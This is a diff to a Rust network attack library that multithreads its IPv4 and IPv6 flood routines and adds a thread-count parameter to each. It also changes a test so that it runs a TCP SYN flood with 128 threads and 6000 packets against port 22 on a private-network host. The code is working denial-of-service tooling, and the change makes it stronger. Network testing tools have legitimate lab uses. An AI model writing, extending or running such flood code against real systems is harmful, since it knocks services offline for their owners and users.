@@ -120,6 +120,7 @@ fn run_flood(
     src_port: u16,
     dst_ipv4: Ipv4Addr,
     dst_port: u16,
+    threads_num: usize,
     max_same_packet: usize,
     max_flood_packet: usize,
 ) -> Result<(usize, usize, Duration)> {
@@ -133,12 +134,30 @@ fn run_flood(
     };
     let mut total_send_buff_size = 0;
     let mut count = 0;
+    let (tx, rx) = channel();
+    let pool = get_threads_pool(threads_num);
+    let mut recv_size = 0;
+
     if max_flood_packet > 0 {
         for _ in 0..max_flood_packet {
-            let send_buff_size = func(src_ipv4, src_port, dst_ipv4, dst_port, max_same_packet)?;
-            total_send_buff_size += send_buff_size;
-            count += 1;
+            recv_size += 1;
+            let tx = tx.clone();
+            pool.execute(move || {
+                let send_buff_size =
+                    match func(src_ipv4, src_port, dst_ipv4, dst_port, max_same_packet) {
+                        Ok(s) => s + 14, // Ethernet frame header length.
+                        Err(_) => 0,
+                    };
+                match tx.send(send_buff_size) {
+                    _ => (),
+                }
+            });
         }
+    }
+    let iter = rx.into_iter().take(recv_size);
+    for send_buff_size in iter {
+        total_send_buff_size += send_buff_size;
+        count += 1;
     }
     Ok((
         count * max_flood_packet,
@@ -153,6 +172,7 @@ fn run_flood6(
     src_port: u16,
     dst_ipv6: Ipv6Addr,
     dst_port: u16,
+    threads_num: usize,
     max_same_packet: usize,
     max_flood_packet: usize,
 ) -> Result<(usize, usize, Duration)> {
@@ -166,12 +186,30 @@ fn run_flood6(
     };
     let mut total_send_buff_size = 0;
     let mut count = 0;
+    let (tx, rx) = channel();
+    let pool = get_threads_pool(threads_num);
+    let mut recv_size = 0;
+
     if max_flood_packet > 0 {
         for _ in 0..max_flood_packet {
-            let send_buff_size = func(src_ipv6, src_port, dst_ipv6, dst_port, max_same_packet)?;
-            total_send_buff_size += send_buff_size;
-            count += 1;
+            recv_size += 1;
+            let tx = tx.clone();
+            pool.execute(move || {
+                let send_buff_size =
+                    match func(src_ipv6, src_port, dst_ipv6, dst_port, max_same_packet) {
+                        Ok(s) => s + 14, // Ethernet frame header length.
+                        Err(_) => 0,
+                    };
+                match tx.send(send_buff_size) {
+                    _ => (),
+                }
+            });
         }
+    }
+    let iter = rx.into_iter().take(recv_size);
+    for send_buff_size in iter {
+        total_send_buff_size += send_buff_size;
+        count += 1;
     }
     Ok((
         count * max_flood_packet,
@@ -190,13 +228,13 @@ pub fn flood(
     max_flood_packet: usize,
 ) -> Result<FloodAttackSummary> {
     let (tx, rx) = channel();
+    let pool = get_threads_pool(threads_num);
     let mut recv_size = 0;
 
     let src_port = match src_port {
         Some(p) => p,
         None => random_port(),
     };
-    let pool = get_threads_pool(threads_num);
     for host in target.hosts {
         let dst_ipv4 = host.addr;
         let src_ipv4 = match find_source_addr(src_ipv4, dst_ipv4)? {
@@ -215,6 +253,7 @@ pub fn flood(
                         src_port,
                         dst_ipv4,
                         dst_port,
+                        threads_num,
                         max_same_packet,
                         max_flood_packet,
                     );
@@ -233,6 +272,7 @@ pub fn flood(
                     src_port,
                     dst_ipv4,
                     0,
+                    threads_num,
                     max_same_packet,
                     max_flood_packet,
                 );
@@ -306,6 +346,7 @@ pub fn flood6(
                         src_port,
                         dst_ipv6,
                         dst_port,
+                        threads_num,
                         max_same_packet,
                         max_flood_packet,
                     );
@@ -324,6 +365,7 @@ pub fn flood6(
                     src_port,
                     dst_ipv6,
                     0,
+                    threads_num,
                     max_same_packet,
                     max_flood_packet,
                 );
@@ -580,11 +622,11 @@ mod tests {
     fn test_convert() {
         let src_ipv4 = None;
         let src_port: Option<u16> = None;
-        let dst_ipv4: Ipv4Addr = Ipv4Addr::new(192, 168, 1, 51);
-        let threads_num: usize = 8;
+        let dst_ipv4: Ipv4Addr = Ipv4Addr::new(192, 168, 1, 52);
+        let threads_num: usize = 128;
         let host = Host::new(dst_ipv4, Some(vec![22]));
         let target: Target = Target::new(vec![host]);
-        let ret = tcp_syn_flood(target, src_ipv4, src_port, threads_num, 30, 30).unwrap();
+        let ret = tcp_syn_flood(target, src_ipv4, src_port, threads_num, 10, 6000).unwrap();
         println!("{}", ret);
     }
 }
